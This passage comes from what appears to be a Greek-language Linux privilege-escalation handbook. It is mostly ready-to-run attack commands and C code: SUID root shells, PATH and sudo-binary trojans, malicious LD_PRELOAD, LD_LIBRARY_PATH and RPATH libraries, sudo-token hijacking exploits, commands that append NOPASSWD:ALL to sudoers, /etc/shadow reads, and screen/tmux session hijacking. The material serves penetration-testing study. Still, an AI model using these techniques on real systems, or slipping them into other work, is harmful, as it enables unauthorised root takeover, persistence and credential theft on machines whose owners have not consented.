chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform will fail the Go plugin handshake but executes the payload as root before dying, leaving a SUID shell behind.

### Υπερκαθορισμοί TF_VAR + παράκαμψη επαλήθευσης symlink

Οι μεταβλητές του Terraform μπορούν να δοθούν μέσω των μεταβλητών περιβάλλοντος `TF_VAR_<name>`, οι οποίες επιβιώνουν όταν το sudo διατηρεί το περιβάλλον. Ανεπαρκείς επαληθεύσεις όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` μπορούν να παρακαμφθούν με symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από attacker. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για να **γράψει** σε προνομιούχες διαδρομές δημιουργώντας εκ των προτέρων destination symlinks (π.χ., δείχνοντας το destination path του provider μέσα στο `/etc/cron.d/`).

### requiretty / !requiretty

Σε κάποιες παλαιότερες διανομές, το sudo μπορεί να ρυθμιστεί με το `requiretty`, το οποίο αναγκάζει το sudo να τρέχει μόνο από ένα διαδραστικό TTY. Εάν το `!requiretty` είναι ορισμένο (ή η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από μη διαδραστικά περιβάλλοντα όπως reverse shells, cron jobs, ή scripts.
```bash
Defaults !requiretty
```
Αυτό από μόνο του δεν είναι άμεση ευπάθεια, αλλά διευρύνει τις καταστάσεις όπου οι κανόνες sudo μπορούν να καταχρηστούν χωρίς την ανάγκη πλήρους PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` δείχνει `env_keep+=PATH` ή ένα `secure_path` που περιέχει καταχωρήσεις εγγράψιμες από επιτιθέμενο (π.χ., `/home/<user>/bin`), οποιαδήποτε σχετική εντολή μέσα στον sudo-επιτρεπόμενο στόχο μπορεί να επισκιαστεί.

- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo παράκαμψη διαδρομών εκτέλεσης
**Jump** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **symlinks**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντιμέτρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς command path

Εάν η **sudo permission** έχει δοθεί σε μία εντολή **χωρίς να καθοριστεί το path**: _hacker10 ALL= (root) less_ μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (πάντα ελέγξτε με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με διαδρομή εντολής

If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Τότε, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### Εγγράψιμο script που εκτελείται από SUID wrapper

Μια συνηθισμένη misconfiguration σε custom-app είναι ένας root-owned SUID binary wrapper που εκτελεί ένα script, ενώ το ίδιο το script είναι writable από low-priv users.

Τυπικό μοτίβο:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Αν το /usr/local/bin/backup.sh είναι εγγράψιμο, μπορείτε να προσθέσετε εντολές payload και στη συνέχεια να εκτελέσετε τον SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Γρήγοροι έλεγχοι:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Αυτή η οδός επίθεσης είναι ιδιαίτερα συνηθισμένη σε "maintenance"/"backup" wrappers που περιλαμβάνονται στο `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so αρχεία) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποφευχθεί η εκμετάλλευση αυτής της δυνατότητας, ειδικά σε εκτελέσιμα με **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί **LD_PRELOAD** για εκτελέσιμα όπου το πραγματικό user ID (_ruid_) δεν ταιριάζει με το ενεργό user ID (_euid_).
- Για εκτελέσιμα με suid/sgid, μόνο βιβλιοθήκες σε standard paths που επίσης έχουν suid/sgid προφορτώνονται.

Privilege escalation μπορεί να προκύψει αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμα και όταν οι εντολές εκτελούνται με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **μεταγλωττίστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τελικά, **escalate privileges** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Μια παρόμοια privesc μπορεί να εκμεταλλευτεί αν ο επιτιθέμενος ελέγχει τη μεταβλητή περιβάλλοντος env **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα binary με **SUID** δικαιώματα που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα εκμετάλλευσης.

Για να εκμεταλλευτεί κανείς αυτό, θα προχωρούσε δημιουργώντας ένα αρχείο C, για παράδειγμα _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στο privilege escalation μέσω χειρισμού των file permissions και εκτέλεσης ενός shell με elevated privileges.

Μεταγλώττισε το παραπάνω C αρχείο σε shared object (.so) αρχείο με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που έχουμε βρει ένα SUID binary που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε εκείνον τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να αξιοποιηθούν από έναν attacker για να παρακάμψουν τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείς **only inject arguments** σε μια εντολή.

Το project συλλέγει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να διαφύγουν από restricted shells, να escalate ή να διατηρήσουν elevated privileges, να μεταφέρουν αρχεία, να spawn bind και reverse shells, και να διευκολύνουν άλλες post-exploitation εργασίες.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Έχεις ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- `gdb` είναι προσβάσιμο (μπορείς να το ανεβάσεις)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείς να το χρησιμοποιήσεις για να **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στο root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που κάνει τα **sudo tokens μόνιμα και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχετε **write permissions** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που δημιουργούνται μέσα σε αυτόν, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **create a sudo token for a user and PID**.\
Για παράδειγμα, αν μπορείτε να υπεργράψετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως user με PID 1234, μπορείτε να **obtain sudo privileges** χωρίς να χρειάζεται να γνωρίζετε το password, κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` καθορίζουν ποιος μπορεί να χρησιμοποιήσει το `sudo` και πώς. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Εάν** μπορείτε να **διαβάσετε** αυτό το αρχείο μπορεί να είστε σε θέση να **αποκτήσετε ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα μπορείτε να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις μπορείς να καταχραστείς αυτή την άδεια
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος κατάχρησης αυτών των δικαιωμάτων:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές στο δυαδικό αρχείο `sudo`, όπως το `doas` για το OpenBSD — θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Εάν γνωρίζεις ότι ένας χρήστης συνήθως συνδέεται σε μια μηχανή και χρησιμοποιεί `sudo` για να κλιμακώσει τα προνόμια και έχεις ένα shell στο περιβάλλον αυτού του χρήστη, μπορείς να **δημιουργήσεις ένα νέο sudo executable** που θα εκτελεί τον κώδικά σου ως root και στη συνέχεια την εντολή του χρήστη. Έπειτα, **τροποποίησε το $PATH** του περιβάλλοντος χρήστη (για παράδειγμα προσθέτοντας τη νέα διαδρομή στο .bash_profile) ώστε όταν ο χρήστης εκτελεί sudo, να εκτελείται το sudo εκτελέσιμό σου.

Σημείωσε ότι αν ο χρήστης χρησιμοποιεί άλλο shell (όχι bash) θα χρειαστεί να τροποποιήσεις άλλα αρχεία για να προσθέσεις τη νέα διαδρομή. Για παράδειγμα[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείς να βρεις ένα ακόμα παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή τρέχοντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` δείχνει **από πού προέρχονται τα αρχεία ρυθμίσεων που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι θα διαβαστούν τα αρχεία ρυθμίσεων από το `/etc/ld.so.conf.d/*.conf`. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου **libraries** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει libraries μέσα στο `/usr/local/lib`**.

Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που αναφέρονται: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται στα αρχεία μέσα στο `/etc/ld.so.conf.d/*.conf` ενδέχεται να μπορέσει να αποκτήσει αυξημένα προνόμια.\
Δείτε **πώς να εκμεταλλευτείτε αυτή την εσφαλμένη ρύθμιση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αντιγράφοντας τη βιβλιοθήκη στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως καθορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων root προνομίων σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα root **προνόμια σε μικρότερες και διακριτές μονάδες**. Καθεμία από αυτές τις μονάδες μπορεί στη συνέχεια να δοθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο μειώνεται το πλήρες σύνολο προνομίων, περιορίζοντας τον κίνδυνο εκμετάλλευσης.\  
Διαβάστε την ακόλουθη σελίδα για να **μάθετε περισσότερα για τις δυνατότητες και πώς να τις καταχραστείτε**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για "execute"** υπονοεί ότι ο επηρεαζόμενος χρήστης μπορεί να "**cd**" μέσα στον φάκελο.\  
Το **"read"** bit υπονοεί ότι ο χρήστης μπορεί να **απαριθμήσει** τα **αρχεία**, και το **"write"** bit υπονοεί ότι ο χρήστης μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο των διακριτικών δικαιωμάτων, ικανό να **υπερισχύει των παραδοσιακών ugo/rwx permissions**. Αυτά τα δικαιώματα βελτιώνουν τον έλεγχο πρόσβασης σε αρχείο ή κατάλογο επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι οι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Αποκτήστε** αρχεία με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Κρυφό ACL backdoor σε sudoers drop-ins

Μια συνηθισμένη λανθασμένη ρύθμιση είναι ένα αρχείο που ανήκει στο root στο `/etc/sudoers.d/` με mode `440` που εξακολουθεί να παρέχει δικαίωμα εγγραφής σε χρήστη χαμηλών προνομίων μέσω ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Εάν δείτε κάτι σαν `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν κανόνα sudo παρά τους περιοριστικούς mode bits:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Αυτή είναι μια διαδρομή ACL persistence/privesc υψηλού αντίκτυπου επειδή είναι εύκολο να παραλειφθεί σε ανασκοπήσεις που βασίζονται μόνο στο `ls -l`.

## Ανοιχτές shell sessions

Σε **παλαιότερες εκδόσεις** μπορεί να **hijack** κάποια **shell** session άλλου χρήστη (**root**).\
Σε **νεότερες εκδόσεις** θα μπορείτε να **connect** μόνο σε screen sessions του **δικού σας χρήστη**. Ωστόσο, μπορεί να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη συνεδρία**.

### screen sessions hijacking

**Λίστα screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Σύνδεση σε session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν ένα πρόβλημα με τις **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να κάνω hijack μια tmux (v2.1) session που δημιουργήθηκε από τον root ως χρήστης χωρίς προνόμια.

**Λίστα tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Σύνδεση σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH κλειδιά που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, etc) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να έχουν επηρεαστεί από αυτό το σφάλμα.\
Αυτό το σφάλμα προκαλείται κατά τη δημιουργία νέου ssh key σε αυτά τα OS, καθώς **υπήρχαν μόνο 32,768 δυνατότητες**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Σημαντικές τιμές διαμόρφωσης

- **PasswordAuthentication:** Καθορίζει εάν επιτρέπεται το password authentication. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει εάν επιτρέπεται το public key authentication. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν το password authentication είναι επιτρεπτό, καθορίζει αν ο server επιτρέπει σύνδεση σε λογαριασμούς με κενές συμβολοσειρές password. Η προεπιλογή είναι `no`.

### Login control files

Αυτά τα αρχεία επηρεάζουν ποιος μπορεί να συνδεθεί και πώς:

- **`/etc/nologin`**: αν υπάρχει, μπλοκάρει μη-root συνδέσεις και εκτυπώνει το μήνυμά του.
- **`/etc/securetty`**: περιορίζει από πού μπορεί να συνδεθεί ο root (λευκή λίστα TTY).
- **`/etc/motd`**: banner μετά τη σύνδεση (μπορεί να leak λεπτομέρειες περιβάλλοντος ή συντήρησης).

### PermitRootLogin

Καθορίζει εάν ο root μπορεί να συνδεθεί μέσω ssh, η προεπιλογή είναι `no`. Πιθανές τιμές:

- `yes`: o root μπορεί να συνδεθεί χρησιμοποιώντας password και private key
- `without-password` or `prohibit-password`: o root μπορεί να συνδεθεί μόνο με private key
- `forced-commands-only`: o root μπορεί να συνδεθεί μόνο με private key και αν έχουν οριστεί επιλογές εντολών
- `no`: όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys που μπορούν να χρησιμοποιηθούν για την πιστοποίηση χρήστη. Μπορεί να περιέχει tokens όπως `%h`, τα οποία θα αντικατασταθούν από τον home directory. **Μπορείτε να υποδείξετε απόλυτες διαδρομές** (που ξεκινούν από `/`) ή **σχετικές διαδρομές από το home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η διαμόρφωση θα δείξει ότι αν προσπαθήσεις να συνδεθείς με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key του κλειδιού σου με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding σού επιτρέπει να **use your local SSH keys instead of leaving keys** (without passphrases!) αντί να τα αφήνεις στον server σου. Έτσι, θα μπορείς να **jump** μέσω ssh **to a host** και από εκεί να **jump to another** host **using** το **key** που βρίσκεται στον **initial host** σου.

Πρέπει να ορίσεις αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετική μηχανή, αυτή η μηχανή θα μπορεί να αποκτήσει πρόσβαση στα κλειδιά (κάτι που αποτελεί ζήτημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **ανατρέψει** αυτές τις **επιλογές** και να επιτρέψει ή να απορρίψει αυτή τη ρύθμιση. Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απορρίψει** το ssh-agent forwarding με τη λέξη-κλειδί `AllowAgentForwarding` (default is allow).

Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον, διαβάστε την ακόλουθη σελίδα καθώς **ενδέχεται να μπορείτε να το καταχραστείτε για να escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Σημαντικά Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Εάν βρεθεί κάποιο περίεργο profile script θα πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.

### Passwd/Shadow Files

Ανάλογα με το OS τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να χρησιμοποιούν διαφορετικό όνομα ή να υπάρχει ένα backup. Επομένως συνιστάται **να τα βρείτε όλα** και **να ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή αντίστοιχο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιούργησε ένα password με μία από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
